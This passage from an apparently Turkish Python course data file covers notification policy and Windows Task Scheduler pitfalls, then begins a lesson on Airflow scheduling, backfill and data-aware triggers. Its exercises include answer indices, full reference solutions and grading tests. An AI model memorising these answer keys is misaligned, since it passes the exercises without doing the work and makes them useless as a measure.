<p>Kurallar: yalnız <b>durum değişince ya da hata olunca</b> bildir (her başarılı çalıştırmada mesaj atmak, kanalı sessize alınan bir gürültüye çevirir); aynı hatayı her 5 dakikada bir tekrar gönderme (susturma süresi); mesaja kişisel veri ya da tam yığın izi koyma, ayrıntıyı log dosyasının yolunu vererek ilet; bildirim gönderilemezse bunu logla ama asıl işi başarısız sayma. E-posta için derste gördüğün <code>EmailMessage</code> + <code>smtplib</code> kalıbını aynı özet metniyle kullan; ek olarak log dosyasının son 50 satırını ekleyebilirsin.</p>
<h2>Windows Görev Zamanlayıcı tuzakları</h2>
<div class="tbl-wrap"><table><tr><th>Belirti</th><th>Neden</th><th>Çözüm</th></tr>
<tr><td>Elle çalışıyor, zamanlanınca "dosya bulunamadı"</td><td>Çalışma klasörü <code>C:\\Windows\\System32</code></td><td>"Başlangıç yeri" (Start in) alanını doldur; kodda <code>Path(__file__).parent</code> kullan</td></tr>
<tr><td>Yalnız oturum açıkken çalışıyor</td><td>"Yalnızca kullanıcı oturum açtığında çalıştır" seçili</td><td>"Kullanıcı oturum açmış olsa da olmasa da çalıştır"ı seç; parola istenir</td></tr>
<tr><td>Oturum kapalıyken ağ sürücüsüne erişemiyor</td><td><code>Z:</code> gibi eşlenmiş sürücüler yalnız etkileşimli oturumda vardır</td><td>UNC yolu kullan: <code>\\\\sunucu\\paylasim\\rapor</code>; hesaba paylaşım izni ver</td></tr>
<tr><td>Parola değişince görev sessizce durdu</td><td>Görev, kaydedilmiş parolayla çalışır</td><td>Parolası süresiz servis hesabı ya da gMSA kullan; parola değişince görevi güncelle</td></tr>
<tr><td>Excel/Outlook otomasyonu takılıyor</td><td>Oturum kapalıyken masaüstü uygulaması açılamaz</td><td>openpyxl/pandas gibi arayüzsüz kütüphaneler, SMTP ya da Graph API kullan</td></tr>
<tr><td>"Son çalıştırma sonucu 0x1"</td><td>Betik 1 çıkış koduyla bitti (Python hatası)</td><td>Betiğin kendi log dosyasına bak; görev çıktısı hiçbir yere yazılmaz</td></tr>
<tr><td>Yanlış Python ya da paket bulunamadı</td><td>PATH'teki <code>python</code> farklı</td><td>Programa sanal ortamın tam yolunu ver: <code>C:\\is\\.venv\\Scripts\\python.exe</code></td></tr></table></div>
<pre class="code">schtasks /create /tn "AnadoluRapor" /sc daily /st 07:45 ^
  /tr "C:\\is\\.venv\\Scripts\\python.exe C:\\is\\rapor.py" ^
  /ru "ANADOLU\\svc_rapor" /rp * /rl LIMITED
schtasks /query /tn "AnadoluRapor" /v /fo LIST     # son çalıştırma zamanı ve sonucu
schtasks /run /tn "AnadoluRapor"                   # şimdi dene</pre>
<p><code>/ru</code> ve <code>/rp *</code> görevin hangi hesapla, oturum açık olmadan çalışacağını belirler (<code>*</code> parolayı gizli sorar). <code>/rl LIMITED</code> yönetici yetkisi vermez; gerekmedikçe yükseltme. "Ayarlar" sekmesinde "görev zaten çalışıyorsa yeni örnek başlatma" seçeneği, derste gördüğün kilit dosyasını tamamlar.</p>
<div class="warn"><b>Kimlik bilgisi tuzağı</b>"Oturum açmasa da çalıştır" seçildiğinde görev, Windows Kimlik Bilgisi Yöneticisi'ne (Credential Manager) senin oturumunda kaydedilmiş sırlara erişemeyebilir ve <code>%USERPROFILE%</code> farklı çözülebilir. Sırları ortam değişkenine görev hesabı için tanımla ya da dosyayı yalnız o hesabın okuyabildiği bir klasöre koy; kendi kişisel hesabını otomasyon için kullanma.</div>
<div class="note"><b>Gerçek işte</b>Ofis otomasyonunun güvenilir olup olmadığını kullanıcılar çıktıdan değil sessizlikten anlar: hata olduğunda bir dakika içinde kanala düşen kısa bir mesaj ve ertesi sabah "dün 3 dosya atlandı, nedeni şu" diyen özet, betiğe duyulan güveni kurar.</div>`,
    ex: [
      {
        t: 'mc',
        id: 'ofis-otomasyon-y1',
        stage: 'Isınma',
        q: 'Görev Zamanlayıcı\'da "oturum açmasa da çalıştır" seçili görev, <code>Z:\\raporlar</code> klasörünü bulamıyor; elle çalıştırınca sorun yok. En olası neden?',
        o: [
          'Görevdeki Python sürümü, betiğin istediğinden eski',
          'Eşlenmiş sürücüler etkileşimsiz oturumda yok; UNC yolu gerekir',
          'Klasörde çok fazla dosya olduğu için listeleme zaman aşımına uğruyor',
          'Görev yönetici yetkisiyle (en yüksek ayrıcalık) çalışmıyor'
        ],
        a: 1,
        why: 'Sürücü harfi eşlemeleri kullanıcının etkileşimli oturumuna aittir; görev ayrı bir oturumda başlar ve Z: yoktur. \\\\sunucu\\paylasim biçimindeki UNC yolu ve görev hesabına paylaşım izni sorunu çözer.'
      },
      {
        t: 'mc',
        id: 'ofis-otomasyon-y2',
        stage: 'Isınma',
        q: 'Her 15 dakikada çalışan bir otomasyon için hangi bildirim politikası doğrudur?',
        o: [
          'Her çalıştırmanın sonunda kanala kısa bir başarı mesajı göndermek',
          'Durum değişince ya da hatada bildirmek; tekrarı susturmak',
          'Tüm sonuçları biriktirip yalnız haftalık bir özet e-postası göndermek',
          'Bildirim göndermeyip her şeyi yalnızca log dosyasına yazmak'
        ],
        a: 1,
        why: 'Günde 96 başarı mesajı kanalı gürültüye çevirir ve insanlar onu sessize alır; o zaman gerçek hata da görülmez. Haftalık özet ya da yalnız log ise hatayı geç fark ettirir.'
      },
      {
        t: 'predict',
        id: 'ofis-otomasyon-y3',
        stage: 'Kodu oku',
        q: 'Bu kod ne yazdırır?',
        o: ['{\'durum\': \'HATA\', \'islenen\': 3, \'hata\': \'ValueError\'}', '{\'durum\': \'HATA\', \'islenen\': 2, \'hata\': \'ValueError\'}', '{\'durum\': \'BAŞARILI\', \'islenen\': 3}', 'ValueError: c.txt'],
        a: 0,
        code: 'def calistir(is_fonksiyonu):\n    ozet = {"durum": "BAŞARILI", "islenen": 0}\n    try:\n        is_fonksiyonu(ozet)\n    except Exception as e:\n        ozet["durum"] = "HATA"\n        ozet["hata"] = type(e).__name__\n    return ozet\n\ndef is_(o):\n    for ad in ["a.csv", "b.csv", "c.txt"]:\n        o["islenen"] += 1\n        if not ad.endswith(".csv"):\n            raise ValueError(ad)\n\nprint(calistir(is_))\n',
        why: 'Sayaç, hata kontrolünden önce artırıldığı için üçüncü dosya da sayılır: 3. İstisna sarmalayıcıda yakalanır, program çökmez ve özet HATA durumunu taşır. Sayaçları işin gerçekten bittiği yerde artırmak daha doğru bir özet verir.'
      },
      {
        t: 'order',
        id: 'ofis-otomasyon-y4',
        stage: 'Kodu oku',
        q: '<p>Teams webhook\'u için JSON gövdesini hazırlayan satırları sırala. Beklenen çıktı:</p><pre class="out">{"text": "[HATA] aylik_rapor: 2 işlendi, 1 atlandı"}</pre>',
        lines: [
          'import json',
          'ozet = {"is": "aylik_rapor", "durum": "HATA", "islenen": 2, "atlanan": 1}',
          'metin = f"[{ozet[\'durum\']}] {ozet[\'is\']}: {ozet[\'islenen\']} işlendi, {ozet[\'atlanan\']} atlandı"',
          'govde = json.dumps({"text": metin}, ensure_ascii=False)',
          'print(govde)'
        ],
        expect: '{"text": "[HATA] aylik_rapor: 2 işlendi, 1 atlandı"}\n',
        hint: 'Metin, gövdeye sarılmadan önce kurulmalı.',
        why: 'Webhook\'lar JSON gövde bekler; metni önce f-string ile kur, sonra json.dumps ile sar. ensure_ascii=False Türkçe karakterleri okunur tutar (gönderirken .encode("utf-8") gerekir).'
      },
      {
        t: 'code',
        id: 'ofis-otomasyon-y5',
        stage: 'Rehberli',
        diff: 2,
        q: '<p>Bildirim kararı: <code>bildirilsin_mi(onceki_durum, ozet, son_bildirim, simdi, susturma_dk=60)</code> yaz. Kurallar sırayla: (1) <code>ozet["durum"]</code> önceki durumdan farklıysa <code>True</code> (ilk çalıştırmada önceki <code>None</code>; başarılıysa bildirme). (2) Durum <code>"HATA"</code> ve <code>son_bildirim</code> <code>None</code> ya da en az <code>susturma_dk</code> dakika önceyse <code>True</code>. (3) Diğer her durumda <code>False</code>. Zamanlar <code>datetime</code>.</p>',
        guide: ['İlk çalıştırma ve başarılı durum: bildirim yok.', 'Durum değiştiyse bildir.', 'Süregelen HATA\'da son bildirimden beri geçen süreyi timedelta ile karşılaştır.'],
        example: 'from datetime import datetime, timedelta\na, b = datetime(2024, 11, 4, 8, 0), datetime(2024, 11, 4, 8, 45)\nprint(b - a >= timedelta(minutes=60))\n',
        start: 'from datetime import datetime, timedelta\n\ndef bildirilsin_mi(onceki_durum, ozet, son_bildirim, simdi, susturma_dk=60):\n    durum = ozet["durum"]\n    # TODO: ilk çalıştırma ve başarı\n    # TODO: durum değişimi\n    # TODO: süregelen hata ve susturma\n    return True\n',
        sol: 'from datetime import datetime, timedelta\n\ndef bildirilsin_mi(onceki_durum, ozet, son_bildirim, simdi, susturma_dk=60):\n    durum = ozet["durum"]\n    if onceki_durum is None and durum == "BAŞARILI":\n        return False\n    if durum != onceki_durum:\n        return True\n    if durum == "HATA":\n        return son_bildirim is None or simdi - son_bildirim >= timedelta(minutes=susturma_dk)\n    return False\n',
        tests: 'T = datetime(2024, 11, 4, 9, 0)\nassert not bildirilsin_mi(None, {"durum": "BAŞARILI"}, None, T), "İlk ve başarılı çalıştırma bildirilmez"\nassert bildirilsin_mi("BAŞARILI", {"durum": "HATA"}, None, T), "Hata başladı: bildir"\nassert not bildirilsin_mi("HATA", {"durum": "HATA"}, T - timedelta(minutes=15), T), "15 dk önce bildirildi: sustur"\nassert bildirilsin_mi("HATA", {"durum": "HATA"}, T - timedelta(minutes=60), T), "Susturma süresi doldu: hatırlat"\nassert bildirilsin_mi("HATA", {"durum": "BAŞARILI"}, T - timedelta(minutes=5), T), "Düzeldi: bildir"\nassert not bildirilsin_mi("BAŞARILI", {"durum": "BAŞARILI"}, None, T), "Süregelen başarı bildirilmez"\nassert bildirilsin_mi(None, {"durum": "UYARILI"}, None, T), "İlk çalıştırmada uyarı varsa bildir"\n',
        hints: ['Kural sırası önemli: önce ilk/başarı, sonra değişim, sonra süregelen hata.', 'simdi - son_bildirim bir timedelta verir.', '"Düzeldi" mesajı da değişim kuralıyla gelir.'],
        why: 'Bu, izleme sistemlerinin (Alertmanager, PagerDuty) temel kuralıdır: değişimde bildir, süregelen sorunu belirli aralıklarla hatırlat, düzelince haber ver. Gürültüsüz bildirim, insanların bildirimlere güvenmeye devam etmesini sağlar.'
      },
      {
        t: 'code',
        id: 'ofis-otomasyon-y6',
        stage: 'Kendin yaz',
        diff: 2,
        q: '<p>Görev Zamanlayıcı denetimi: <code>gorev_denetle(gorev)</code> yaz. <code>gorev</code> sözlüğünde <code>program</code>, <code>argumanlar</code>, <code>baslangic_yeri</code>, <code>oturumsuz</code> (bool), <code>hesap</code> alanları var. Şu sırayla sorun mesajları döndür:</p><ul><li><code>program</code> küçük harfle <code>python.exe</code>, <code>python</code> ya da <code>py</code> ile <b>bitiyorsa</b> ve içinde <code>\\</code> yoksa: <code>"python tam yol değil"</code></li><li><code>baslangic_yeri</code> boşsa: <code>"başlangıç yeri yok"</code></li><li><code>argumanlar</code> içinde sürücü harfli yol (<code>[A-Z]:\\</code>) varsa ve harf <code>C</code> değilse ve <code>oturumsuz</code> ise: <code>"eşlenmiş sürücü: X:"</code></li><li><code>hesap</code> bir kişi hesabıysa (<code>svc_</code> ile başlamıyorsa, alan adı öneki <code>ANADOLU\\</code> atılarak) ve <code>oturumsuz</code> ise: <code>"kişisel hesap"</code></li></ul>',
        start: 'import re\n\ndef gorev_denetle(gorev):\n    pass\n',
        sol: 'import re\n\ndef gorev_denetle(gorev):\n    s = []\n    prog = gorev.get("program", "")\n    if "\\\\" not in prog and prog.lower().endswith(("python.exe", "python", "py")):\n        s.append("python tam yol değil")\n    if not gorev.get("baslangic_yeri"):\n        s.append("başlangıç yeri yok")\n    if gorev.get("oturumsuz"):\n        for harf in re.findall(r"([A-Za-z]):\\\\", gorev.get("argumanlar", "")):\n            if harf.upper() != "C":\n                s.append(f"eşlenmiş sürücü: {harf.upper()}:")\n                break\n        hesap = gorev.get("hesap", "").split("\\\\")[-1]\n        if not hesap.lower().startswith("svc_"):\n            s.append("kişisel hesap")\n    return s\n',
        tests: 'iyi = {"program": r"C:\\is\\.venv\\Scripts\\python.exe", "argumanlar": r"C:\\is\\rapor.py \\\\dosya\\rapor", "baslangic_yeri": r"C:\\is", "oturumsuz": True, "hesap": r"ANADOLU\\svc_rapor"}\nassert gorev_denetle(iyi) == [], "UNC yolu ve servis hesabıyla sorun yok"\nkotu = {"program": "python.exe", "argumanlar": r"Z:\\raporlar\\aylik.py", "baslangic_yeri": "", "oturumsuz": True, "hesap": r"ANADOLU\\ayse.yilmaz"}\nassert gorev_denetle(kotu) == ["python tam yol değil", "başlangıç yeri yok", "eşlenmiş sürücü: Z:", "kişisel hesap"], f"Gelen: {gorev_denetle(kotu)}"\netkilesimli = dict(kotu, oturumsuz=False, program="py", baslangic_yeri=r"C:\\is")\nassert gorev_denetle(etkilesimli) == ["python tam yol değil"], "Oturum açıkken sürücü ve hesap sorun değil"\n',
        hints: ['Raw string içinde ters bölü kontrolü: "\\\\" in prog.', 'Sürücü harfleri: re.findall(r"([A-Za-z]):\\\\", metin).', 'Alan adını split("\\\\")[-1] ile at.'],
        why: 'Bu kontroller, "elle çalışıyor ama zamanlanınca çalışmıyor" vakalarının çoğunu daha kurulumda yakalar. Ekiplerde görev tanımları XML olarak dışa aktarılıp (schtasks /query /xml) bu tür bir betikle denetlenebilir.'
      },
      {
        t: 'code',
        id: 'ofis-otomasyon-y7',
        stage: 'Hata avı',
        kind: 'bug',
        diff: 2,
        q: '<p>Hatayı bul ve düzelt. <code>guvenli_bildir(gonder, ozet)</code> bildirim gönderir; bildirim başarısız olursa (herhangi bir <code>OSError</code>) asıl iş sonucu etkilenmemeli: <code>False</code> döndürmeli. Mesaj metni 300 karakteri geçerse sonuna <code>"…"</code> ekleyerek 300 karaktere kırpılmalı (yığın izi gibi uzun hatalar). Şu anki kod ağ hatasında çöküyor ve kırpmada 301 karakter üretiyor.</p>',
        start: 'def guvenli_bildir(gonder, ozet):\n    metin = f"[{ozet[\'durum\']}] {ozet[\'is\']}: {ozet.get(\'hata\', \'\')}"\n    if len(metin) > 300:\n        metin = metin[:300] + "…"\n    gonder(metin)\n    return True\n',
        sol: 'def guvenli_bildir(gonder, ozet):\n    metin = f"[{ozet[\'durum\']}] {ozet[\'is\']}: {ozet.get(\'hata\', \'\')}"\n    if len(metin) > 300:\n        metin = metin[:299] + "…"\n    try:\n        gonder(metin)\n    except OSError:\n        return False\n    return True\n',
        tests: 'giden = []\nassert guvenli_bildir(giden.append, {"durum": "HATA", "is": "rapor", "hata": "x" * 1000}) is True, "Başarılı gönderim True"\nassert len(giden[0]) == 300 and giden[0].endswith("…"), f"Metin tam 300 karakter olmalı: {len(giden[0])}"\ndef bozuk(m):\n    raise ConnectionError("ağ yok")\nassert guvenli_bildir(bozuk, {"durum": "HATA", "is": "rapor"}) is False, "Ağ hatası yakalanmalı (ConnectionError bir OSError\'dır)"\ndef zaman_asimi(m):\n    raise TimeoutError()\nassert guvenli_bildir(zaman_asimi, {"durum": "HATA", "is": "rapor"}) is False, "Zaman aşımı da OSError ailesindendir"\n',
        hints: ['İki hata: try/except eksik ve kırpma bir fazla.', '"…" tek karakterdir; 299 + 1 = 300.', 'except OSError: return False'],
        why: 'Bildirim yan iştir: kendi hatası asıl işi başarısız göstermemeli ve yeniden denemeye sokmamalı. ConnectionError, TimeoutError ve urllib.error.URLError hepsi OSError ailesindendir; tek except ile yakalanır.'
      },
      {
        t: 'code',
        id: 'ofis-otomasyon-y8',
        stage: 'Meydan okuma',
        diff: 3,
        q: '<p>Çalışma geçmişinden sabah özeti: <code>sabah_ozeti(gecmis_csv)</code> yaz. CSV sütunları: <code>is,baslangic,durum,islenen,atlanan</code> (<code>baslangic</code> ISO metin). Her iş için son çalıştırmanın durumunu, son 24 saatteki (en yeni kaydın zamanına göre, o an dahil, 24 saat öncesi hariç) toplam işlenen ve atlanan sayısını ve son 24 saatteki <code>HATA</code> sayısını hesapla. Satırları <code>"&lt;is&gt;: son=&lt;durum&gt; işlenen=&lt;n&gt; atlanan=&lt;n&gt; hata=&lt;n&gt;"</code> biçiminde, önce son durumu HATA olanlar, sonra iş adına göre alfabetik sırala ve <code>\n</code> ile birleştir.</p>',
        start: 'import csv, io\nfrom datetime import datetime, timedelta\n\ndef sabah_ozeti(gecmis_csv):\n    pass\n',
        sol: 'import csv, io\nfrom datetime import datetime, timedelta\n\ndef sabah_ozeti(gecmis_csv):\n    satirlar = list(csv.DictReader(io.StringIO(gecmis_csv)))\n    if not satirlar:\n        return ""\n    for r in satirlar:\n        r["t"] = datetime.fromisoformat(r["baslangic"])\n    simdi = max(r["t"] for r in satirlar)\n    esik = simdi - timedelta(hours=24)\n    isler = {}\n    for r in sorted(satirlar, key=lambda r: r["t"]):\n        d = isler.setdefault(r["is"], {"son": None, "islenen": 0, "atlanan": 0, "hata": 0})\n        d["son"] = r["durum"]\n        if r["t"] > esik:\n            d["islenen"] += int(r["islenen"])\n            d["atlanan"] += int(r["atlanan"])\n            d["hata"] += r["durum"] == "HATA"\n    sira = sorted(isler, key=lambda a: (isler[a]["son"] != "HATA", a))\n    return "\\n".join(f"{a}: son={isler[a][\'son\']} işlenen={isler[a][\'islenen\']} atlanan={isler[a][\'atlanan\']} hata={isler[a][\'hata\']}" for a in sira)\n',
        tests: 'G = """is,baslangic,durum,islenen,atlanan\nrapor,2024-11-03T07:45:00,BAŞARILI,12,0\nyedek,2024-11-03T08:00:00,HATA,0,0\nrapor,2024-11-04T07:45:00,UYARILI,10,2\nyedek,2024-11-04T02:00:00,HATA,0,0\nyedek,2024-11-04T08:00:00,HATA,0,0\narsiv,2024-11-04T06:00:00,BAŞARILI,40,1\n"""\nbeklenen = "yedek: son=HATA işlenen=0 atlanan=0 hata=2\\narsiv: son=BAŞARILI işlenen=40 atlanan=1 hata=0\\nrapor: son=UYARILI işlenen=10 atlanan=2 hata=0"\nassert sabah_ozeti(G) == beklenen, "Gelen:\\n" + sabah_ozeti(G)\nassert sabah_ozeti("is,baslangic,durum,islenen,atlanan\\n") == "", "Boş geçmiş"\n',
        hints: [
          'Zamanları datetime\'a çevir; "şimdi" en yeni kaydın zamanıdır (testte sabit kalır).',
          'Kayıtları zamana göre sıralayıp gezersen son durum kendiliğinden en yeni kayıt olur.',
          'Tam 24 saat önceki kayıt (08:00 → 08:00) pencere dışıdır: t > esik.'
        ],
        why: '"Şimdi"yi veriden almak, özeti test edilebilir ve yeniden üretilebilir kılar. HATA\'daki işleri başa almak ise okuyanın ilk satırda neye bakacağını bilmesini sağlar.'
      }
    ],
    faq: [
      {
        q: 'Teams webhook yerine Microsoft Graph API kullanmalı mıyım?',
        a: 'Yalnız bir kanala bildirim atacaksan webhook/Workflows yeterli ve kurulumu en basitidir. Kişilere doğrudan mesaj, dosya yükleme, takvim gibi işler gerekiyorsa Graph API ve bir uygulama kaydı (Azure AD/Entra) gerekir; bu da yetki onayı ister.'
      }
    ]
  }
);
})(window);
/* Kesit Python — 'orkestrasyon' uzantısı (AUDIT 12, Derinleş + ek alıştırmalar) */
(function (W) {
'use strict';
const X = W.PY_EXT = W.PY_EXT || [];
X.push(
  {
    id: 'orkestrasyon',
    min: 30,
    needs: ['sqlite3'],
    html: `<p>Derste TaskFlow'a kısa bir örnekle girdin ve backfill'in ne olduğunu gördün. Bu bölüm Airflow'un en çok kafa karıştıran üç konusunu açıyor: bir çalışmanın <b>hangi zaman dilimini</b> işlediği (data interval), <b>catchup</b> ile <b>backfill</b> arasındaki fark ve saat yerine <b>veri güncellenince</b> tetiklenen zamanlama. Sonunda aynı akışı Prefect ve Dagster'da da göreceksin.</p>
<h2>Data interval: çalışma, dilimin sonunda başlar</h2>
<p>Airflow'da günlük bir DAG, "1 Ekim" verisini 1 Ekim'de değil, gün <b>bittikten sonra</b> (2 Ekim 00:00'dan sonra) işler; çünkü ancak o zaman günün verisi tamamdır. Her çalışma bir zaman dilimi taşır: <code>data_interval_start</code> (ve onun eşi <code>logical_date</code>, şablonda <code>{{ ds }}</code>) ile <code>data_interval_end</code>. Görevlerin "şimdi"ye değil bu dilime bakması, backfill'in ve yeniden çalıştırmanın doğru sonuç vermesinin tek yoludur.</p>
<div class="tbl-wrap"><table><tr><th>Çalışma</th><th>data_interval_start (ds)</th><th>data_interval_end</th><th>Gerçekte başladığı an</th></tr>
<tr><td>Günlük, 1. çalışma</td><td>2024-10-01 00:00</td><td>2024-10-02 00:00</td><td>2024-10-02 00:00 sonrası</td></tr>
<tr><td>Günlük, 2. çalışma</td><td>2024-10-02 00:00</td><td>2024-10-03 00:00</td><td>2024-10-03 00:00 sonrası</td></tr></table></div>
<p>Dilim <b>yarı açıktır</b>: başlangıç dahil, bitiş hariç. SQL'de bunun karşılığı <code>zaman &gt;= :bas AND zaman &lt; :bit</code>'tir; <code>BETWEEN</code> iki ucu da dahil eder ve gece yarısındaki kayıtları iki güne birden yazar.</p>
<pre class="py">import veri
from datetime import date, timedelta
conn = veri.baglan("lezzet_kurye", tablolar=["lk_orders"])

def gunluk_siparis(ds: date) -&gt; int:           # görev: yalnız kendi dilimine bakar
    bas, bit = ds.isoformat(), (ds + timedelta(days=1)).isoformat()
    return conn.execute("SELECT COUNT(*) FROM lk_orders WHERE placed_at &gt;= ? AND placed_at &lt; ?",
                        (bas, bit)).fetchone()[0]

ds = date(2024, 10, 1)                         # backfill: 1-7 Ekim
while ds &lt;= date(2024, 10, 7):
    print(ds, gunluk_siparis(ds))
    ds += timedelta(days=1)</pre>
<h2>TaskFlow derinlemesine</h2>
<pre class="code">from airflow.decorators import dag, task      # Airflow 3: from airflow.sdk import dag, task
from datetime import datetime

@dag(schedule="@daily", start_date=datetime(2024, 10, 1), catchup=False,
     max_active_runs=1, default_args={"retries": 2})
def lezzet_gunluk():
    @task
    def subeler() -&gt; list[str]:
        return ["izmir", "ankara", "istanbul"]

    @task
    def cek(sube: str, data_interval_start=None) -&gt; str:   # bağlam argümanı adla enjekte edilir
        ds = data_interval_start.strftime("%Y-%m-%d")
        return f"s3://ham/{sube}/{ds}.parquet"              # XCom'a veri değil YOL koy

    @task(multiple_outputs=True)
    def ozet(yollar: list[str]) -&gt; dict:
        return {"dosya": len(yollar), "durum": "tamam"}

    yollar = cek.expand(sube=subeler())       # dinamik eşleme: her şube için bir görev örneği
    ozet(yollar)

lezzet_gunluk()</pre>
<p><code>.expand()</code> dinamik görev eşlemesidir (dynamic task mapping): şube sayısı çalışma anında belirlenir ve her biri ayrı, ayrı yeniden denenebilen bir görev olur. <code>multiple_outputs=True</code> sözlüğün her anahtarını ayrı XCom yapar. <code>max_active_runs=1</code> aynı DAG'ın iki gününün aynı anda çalışmasını engeller.</p>
<h2>catchup mı, backfill mi?</h2>
<div class="tbl-wrap"><table><tr><th></th><th>catchup=True</th><th>Backfill</th></tr>
<tr><td>Kim başlatır?</td><td>Zamanlayıcı, kendiliğinden</td><td>Sen, komutla</td></tr>
<tr><td>Hangi dilimler?</td><td><code>start_date</code>'ten bugüne kadar çalışmamış <b>tüm</b> dilimler</td><td>Verdiğin aralık (<code>-s</code> ile <code>-e</code>)</td></tr>
<tr><td>Ne zaman tehlikeli?</td><td>Eski start_date ile yeni DAG açınca yüzlerce çalışma kuyruğa girer</td><td>Görev idempotent değilse veri ikilenir</td></tr></table></div>
<pre class="code">airflow dags backfill lezzet_gunluk -s 2024-10-01 -e 2024-10-07       # Airflow 2
airflow backfill create --dag-id lezzet_gunluk \\
    --from-date 2024-10-01 --to-date 2024-10-07 --max-active-runs 2   # Airflow 3</pre>
<p>Pratik kural: yeni DAG'ları <code>catchup=False</code> ile aç, geçmişi gerekiyorsa bilinçli bir backfill komutuyla ve <code>max_active_runs</code> sınırıyla doldur. <code>depends_on_past=True</code> bir günün görevi, bir önceki günün aynı görevi başarılı olmadan başlamasın der; kümülatif tablolarda (dünkü bakiye + bugünkü hareket) gereklidir.</p>
<h2>Veri farkındalıklı zamanlama: dataset ve asset</h2>
<p>"Her gün 02:00'de çalış" yerine "<code>siparisler</code> tablosu güncellenince çalış" demek, üreticisi gecikince tüketicinin boş veriyle çalışmasını önler. Airflow 2.4+ bunu <code>Dataset</code>, Airflow 3 <code>Asset</code> adıyla yapar: üretici görev <code>outlets</code> ile neyi güncellediğini bildirir, tüketici DAG <code>schedule=[...]</code> ile bekler. Listedeki <b>tüm</b> varlıklar son çalışmadan beri güncellenince tetiklenir.</p>
<pre class="code">from airflow.sdk import Asset, dag, task
siparisler = Asset("s3://ambar/siparisler")
kuryeler = Asset("s3://ambar/kuryeler")

@dag(schedule="@hourly")
def uretici():
    @task(outlets=[siparisler])
    def yaz(): ...
    yaz()

@dag(schedule=[siparisler, kuryeler])        # ikisi de güncellenince
def kurye_performans():
    ...</pre>
<h2>Aynı akış Prefect ve Dagster'da</h2>
<pre class="code"># Prefect: sıradan Python, @flow ve @task
from prefect import flow, task
@task(retries=2)
def cek(sube: str, gun: str) -&gt; str: ...
@flow
def lezzet_gunluk(gun: str):
    yollar = cek.map(["izmir", "ankara"], gun)

# Dagster: varlık (asset) odaklı; "hangi tablo neyden üretilir"
from dagster import asset, DailyPartitionsDefinition
gunluk = DailyPartitionsDefinition(start_date="2024-10-01")
@asset(partitions_def=gunluk)
def ham_siparis(context): ...
@asset(partitions_def=gunluk)
def gunluk_ozet(ham_siparis): ...           # bağımlılık parametre adından çıkar</pre>
<p>Prefect'te zamanlama ve dağıtım akıştan ayrıdır, dinamik akışlar doğaldır. Dagster'da birincil kavram görev değil <b>tablo</b>dur; bölümler (partitions) backfill'i "şu günlerin bölümlerini yeniden üret" düğmesine indirir ve soy ağacı (lineage) kendiliğinden çizilir.</p>
<div class="note"><b>Gerçek işte</b>Orkestrasyon hatalarının çoğu araçtan değil zaman kavramından çıkar: "şimdi"ye bakan görev, <code>BETWEEN</code> ile çift sayılan gece yarısı, saat dilimi olmayan <code>start_date</code>, idempotent olmayan yükleme. Mülakatta "Dünün işini yeniden çalıştırırsan ne olur?" sorusuna net cevap verebilmek, Airflow'un bütün menülerini bilmekten değerlidir.</div>`,
    ex: [
      {
        t: 'mc',
        id: 'orkestrasyon-y1',
        stage: 'Isınma',
        q: '<code>schedule="@daily"</code>, <code>start_date=2024-10-01</code> olan bir DAG\'ın ilk çalışması ne zaman başlar ve hangi veriyi işler?',
        o: ['1 Ekim 00:00\'da başlar, 1 Ekim verisini işler', '2 Ekim 00:00 sonrası başlar, 1 Ekim verisini işler', '2 Ekim 00:00 sonrası başlar, 2 Ekim verisini işler', '1 Ekim 00:00\'da başlar, 30 Eylül verisini işler'],
        a: 1,
        why: 'Airflow bir dilimi o dilim bittikten sonra çalıştırır: [1 Ekim 00:00, 2 Ekim 00:00) diliminin çalışması 2 Ekim 00:00\'dan sonra başlar ve ds = 2024-10-01 olur. Bu yüzden görevler "bugün"e değil data_interval_start/ds değerine bakmalıdır.'
      },
      {
        t: 'mc',
        id: 'orkestrasyon-y2',
        stage: 'Isınma',
        q: 'Yeni bir günlük DAG\'ı <code>start_date</code> 90 gün önce olacak şekilde <code>catchup=True</code> ile açtın. Ne olur?',
        o: [
          'Yalnız bugünün çalışması oluşur',
          'Zamanlayıcı geçmiş 90 dilimin hepsi için çalışma oluşturur',
          'DAG hata verir; geçmiş tarihli start_date yasaktır',
          'Geçmiş dilimler için yalnız başarısız görevler yeniden denenir'
        ],
        a: 1,
        why: 'catchup=True, start_date\'ten bu yana çalışmamış her dilim için kendiliğinden çalışma oluşturur. max_active_runs sınırlı değilse kaynaklar dolar. Yeni DAG\'ları catchup=False ile açıp geçmişi bilinçli bir backfill ile doldurmak daha güvenlidir.'
      },
      {
        t: 'predict',
        id: 'orkestrasyon-y3',
        stage: 'Kodu oku',
        needs: ['sqlite3'],
        q: 'Gerçek <code>lk_orders</code> tablosunda 1-3 Ekim için iki sorgu: bu kod ne yazdırır?',
        o: ['115 166', '166 166', '115 115', '166 115'],
        a: 0,
        code: 'import veri\nc = veri.baglan("lezzet_kurye", tablolar=["lk_orders"])\na = c.execute("SELECT COUNT(*) FROM lk_orders WHERE placed_at BETWEEN \'2024-10-01\' AND \'2024-10-03\'").fetchone()[0]\nb = c.execute("SELECT COUNT(*) FROM lk_orders WHERE placed_at >= \'2024-10-01\' AND placed_at < \'2024-10-04\'").fetchone()[0]\nprint(a, b)\n',
        why: 'placed_at metin olarak "2024-10-03 11:20:00" biçimindedir ve "2024-10-03"ten büyüktür; BETWEEN üst sınırı 3 Ekim\'in tüm siparişlerini dışarıda bırakır (62 + 53 = 115). Yarı açık aralık (>= başlangıç, < ertesi gün) üç günü eksiksiz alır: 62 + 53 + 51 = 166.'
      },
      {
        t: 'order',
        id: 'orkestrasyon-y4',
        stage: 'Kodu oku',
        q: '<p>Haftalık bir DAG\'ın backfill dilimlerini (yarı açık) üreten programın satırlarını sırala. Beklenen çıktı:</p><pre class="out">2024-10-07 → 2024-10-14\n2024-10-14 → 2024-10-21</pre>',
        lines: ['from datetime import date, timedelta', 'adim = timedelta(weeks=1)', 'bas, son = date(2024, 10, 7), date(2024, 10, 21)', 'while bas + adim <= son:', '    print(bas, "→", bas + adim)', '    bas += adim'],
        expect: '2024-10-07 → 2024-10-14\n2024-10-14 → 2024-10-21\n',
        hint: 'Adım ve sınırlar döngüden önce tanımlanır; yazdırma, ilerletmeden önce gelir.',
        why: 'Koşul "dilimin sonu bitişi geçmesin" der; böylece yalnız tamamlanmış haftalar işlenir. bas += adim döngünün son satırı olmalı, yoksa ilk dilim atlanır.'
      },
      {
        t: 'code',
        id: 'orkestrasyon-y5',
        stage: 'Rehberli',
        diff: 2,
